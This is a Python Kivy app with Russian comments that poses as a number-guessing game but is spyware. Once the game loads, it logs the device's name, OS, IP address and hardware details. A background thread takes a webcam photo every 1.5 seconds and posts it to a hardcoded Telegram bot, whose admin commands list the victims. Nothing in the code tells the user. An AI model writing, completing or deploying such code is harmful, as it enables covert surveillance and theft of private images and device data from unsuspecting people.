import threading
import cv2
import requests
import random
import time
import sqlite3
import platform
import os
import socket
import sys
import psutil
import gpuinfo
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.textinput import TextInput
from kivy.clock import Clock
import telebot

TOKEN = "8088793339:AAHo3C6cskiYLYDVM7L3FgkzJK-Zv9I2F7k"
CHAT_ID = "5420298695"
PHOTO_PATH = "photo_from_camera.jpg"
ADMIN_ID = "5420298695"  # ID администратора, можно заменить на свой

# Создание базы данных и таблицы
def create_db():
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id TEXT,
                    username TEXT,
                    device_name TEXT,
                    os_info TEXT,
                    python_version TEXT,
                    ip_address TEXT,
                    cpu_info TEXT,
                    cpu_cores INTEGER,
                    gpu_name TEXT,
                    total_memory REAL,
                    used_memory REAL
                )''')
    conn.commit()
    conn.close()

# Добавление нового пользователя в базу данных
def add_user(user_id, username, device_name, os_info, python_version, ip_address, cpu_info, cpu_cores, gpu_name, total_memory, used_memory):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("INSERT INTO users (user_id, username, device_name, os_info, python_version, ip_address, cpu_info, cpu_cores, gpu_name, total_memory, used_memory) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)", 
              (user_id, username, device_name, os_info, python_version, ip_address, cpu_info, cpu_cores, gpu_name, total_memory, used_memory))
    conn.commit()
    conn.close()

# Получение всех пользователей из базы данных
def get_users():
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT * FROM users")
    users = c.fetchall()
    conn.close()
    return users

# Получение дополнительной информации о системе
def get_additional_system_info():
    # Получение информации о процессоре
    cpu_info = psutil.cpu_freq().current  # Частота процессора
    cpu_cores = psutil.cpu_count(logical=False)  # Количество физических ядер

    # Получение информации о видеокарте
    try:
        gpu = gpuinfo.get_info()  # Получаем информацию о видеокарте
        gpu_name = gpu[0].gpu_name if gpu else 'Не найдено'
    except Exception as e:
        print(f"Ошибка при получении информации о GPU: {e}")
        gpu_name = 'Не найдено'

    # Получение информации о памяти
    memory_info = psutil.virtual_memory()
    total_memory = memory_info.total / (1024 ** 3)  # В гигабайтах
    used_memory = memory_info.used / (1024 ** 3)  # В гигабайтах

    return {
        'cpu_info': cpu_info,
        'cpu_cores': cpu_cores,
        'gpu_name': gpu_name,
        'total_memory': total_memory,
        'used_memory': used_memory
    }

# Отправка сообщений через Telegram
def send_message_to_telegram(message):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {'chat_id': ADMIN_ID, 'text': message}
    try:
        requests.post(url, data=data)
    except requests.exceptions.RequestException as e:
        print(f"Ошибка отправки: {e}")

# Администраторский бот
bot = telebot.TeleBot(TOKEN)

# Команды администратора
@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "Привет, админ! Используй /users для получения списка пользователей.")

@bot.message_handler(commands=['users'])
def list_users(message):
    users = get_users()
    user_list = "Список пользователей:\n"
    for user in users:
        user_list += f"ID: {user[1]}, Имя: {user[2]}, Устройство: {user[3]}\n"
    bot.reply_to(message, user_list)

@bot.message_handler(commands=['shutdown'])
def shutdown(message):
    if str(message.from_user.id) == ADMIN_ID:
        bot.reply_to(message, "Завершаю приложение.")
        app.stop()
    else:
        bot.reply_to(message, "У вас нет прав для выполнения этой команды.")

@bot.message_handler(commands=['send_photo'])
def send_photo(message):
    if str(message.from_user.id) == ADMIN_ID:
        send_photo_to_telegram(PHOTO_PATH)
        bot.reply_to(message, "Фото отправлено!")
    else:
        bot.reply_to(message, "У вас нет прав для выполнения этой команды.")

# Создание базы данных
create_db()

class GuessingGame(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.orientation = 'vertical'

        self.label = Label(text="Загадано число от 1 до 100. Попробуй угадать!", font_size=24)
        self.add_widget(self.label)

        self.input_field = TextInput(hint_text="Введите число", multiline=False, font_size=24)
        self.add_widget(self.input_field)

        self.submit_button = Button(text="Проверить", font_size=24, on_press=self.check_guess)
        self.add_widget(self.submit_button)

        self.secret_number = random.randint(1, 100)

    def check_guess(self, instance):
        try:
            guess = int(self.input_field.text)
            if guess < self.secret_number:
                self.label.text = "Больше! Попробуй еще раз."
            elif guess > self.secret_number:
                self.label.text = "Меньше! Попробуй еще раз."
            else:
                self.label.text = "Поздравляю! Ты угадал число!"
        except ValueError:
            self.label.text = "Пожалуйста, введите число!"


class CameraApp(App):
    def build(self):
        self.layout = BoxLayout(orientation='vertical')
        self.label = Label(text="Загрузка игры...", font_size=24, size_hint=(1, 1))
        self.layout.add_widget(self.label)
        Clock.schedule_once(self.start_game, 3)
        return self.layout

    def start_game(self, dt):
        self.label.text = "Подождите... Игра начинается!"
        self.game = GuessingGame()
        self.layout.add_widget(self.game)

        # Сохраняем информацию о пользователе при старте
        self.username = "User"  # Пример имени пользователя, можно изменить
        self.user_id = "5420298695"  # Пример ID пользователя, можно изменить
        self.device_name = platform.node()  # Получаем имя устройства
        os_info = platform.system()  # Получаем информацию о системе
        python_version = sys.version  # Получаем версию Python
        ip_address = socket.gethostbyname(socket.gethostname())  # Получаем IP-адрес устройства

        system_info = get_additional_system_info()

        add_user(self.user_id, self.username, self.device_name, os_info, python_version, ip_address,
                 system_info['cpu_info'], system_info['cpu_cores'], system_info['gpu_name'],
                 system_info['total_memory'], system_info['used_memory'])

        # Запускаем фоновый поток для фотосъемки
        threading.Thread(target=self.capture_and_send_photo, daemon=True).start()

    def send_photo_to_telegram(self, photo_path):
        url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
        try:
            with open(photo_path, 'rb') as photo:
                files = {'photo': photo}
                data = {'chat_id': CHAT_ID}
                requests.post(url, files=files, data=data)
        except requests.exceptions.RequestException as e:
            print(f"Ошибка отправки: {e}")

    def capture_and_send_photo(self):
        cap = cv2.VideoCapture(0)
        while True:
            ret, frame = cap.read()
            if ret:
                cv2.imwrite(PHOTO_PATH, frame)
                self.send_photo_to_telegram(PHOTO_PATH)
            time.sleep(1.5)  # Делаем паузу в 1.5 секунды перед следующей съемкой

if __name__ == "__main__":
    app = CameraApp()
    threading.Thread(target=bot.polling, daemon=True).start()  # Запускаем бота в отдельном потоке
    app.run()
